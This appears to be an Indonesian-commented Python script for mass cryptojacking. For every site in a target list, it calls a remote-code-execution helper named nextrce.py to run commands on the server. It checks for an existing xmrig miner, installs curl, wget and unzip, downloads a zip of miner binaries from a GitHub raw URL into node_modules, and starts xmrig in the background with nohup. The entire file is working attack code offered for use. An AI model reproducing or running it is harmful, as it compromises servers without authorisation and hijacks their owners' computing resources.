import subprocess

SITELIST = "z.txt"
INFECTED_FILE = "infected.txt"
CLEAN_FILE = "clean.txt"

INSTALL_COMMANDS = [
    "apt update -y",
    "apt install curl -y",
    "apt install wget -y",
    "apt install unzip -y",
    "mkdir -p node_modules"
]

CURL_CMD = "curl -L https://raw.githubusercontent.com/animejawa/tail/refs/heads/main/zzx.zip -o node_modules/zzx.zip"
WGET_CMD = "wget -O node_modules/zzx.zip https://raw.githubusercontent.com/animejawa/tail/refs/heads/main/zzx.zip"

POST_COMMANDS = [
    "unzip -o node_modules/zzx.zip -d node_modules",
    "chmod +x node_modules/xmrig",
    "nohup node_modules/xmrig --config config.json >> node_modules/xmrig1.log 2>&1 &",
    "ps aux | grep xmrig | grep -v grep"
]

def run_remote(url, cmd):
    try:
        process = subprocess.run(
            ["python3", "nextrce.py", "-u", url, "-c", cmd],
            capture_output=True,
            text=True,
            timeout=60
        )
        return process.stdout + process.stderr
    except Exception as e:
        return str(e)


with open(SITELIST, "r") as f:
    sites = [line.strip() for line in f if line.strip()]

for url in sites:
    print(f"\n[+] Checking {url}")

    # ======================
    # 1️⃣ CEK xmrig DULU
    # ======================
    xmrig_check = run_remote(
        url,
        "ps aux | grep -E 'xmrig.*config' | grep -v grep"
    )

    if "xmrig" in xmrig_check:
        print("[!] xmrig ditemukan. Skip server ini.")

        with open(INFECTED_FILE, "a") as infected:
            infected.write(url + "\n")

        continue

    # ======================
    # 2️⃣ SERVER BERSIH
    # ======================
    print("[✓] Tidak ada xmrig. Lanjut proses.")

    with open(CLEAN_FILE, "a") as clean:
        clean.write(url + "\n")

    # Install dependency
    for cmd in INSTALL_COMMANDS:
        print(f"[>] {cmd}")
        run_remote(url, cmd)

    # Download via curl
    print("[>] Download via curl")
    run_remote(url, CURL_CMD)

    # Cek hasil curl
    check = run_remote(url, "ls node_modules | grep zzx.zip")

    if "zzx.zip" not in check:
        print("[!] Curl gagal. Coba wget.")
        run_remote(url, WGET_CMD)

        check = run_remote(url, "ls node_modules | grep zzx.zip")
        if "zzx.zip" not in check:
            print("[✗] Download gagal total. Skip.")
            continue

    print("[✓] Download berhasil.")

    # Eksekusi file
    for cmd in POST_COMMANDS:
        print(f"[>] {cmd}")
        run_remote(url, cmd)

    print(f"[+] Done {url}")

print("\n=== SELESAI SEMUA ===")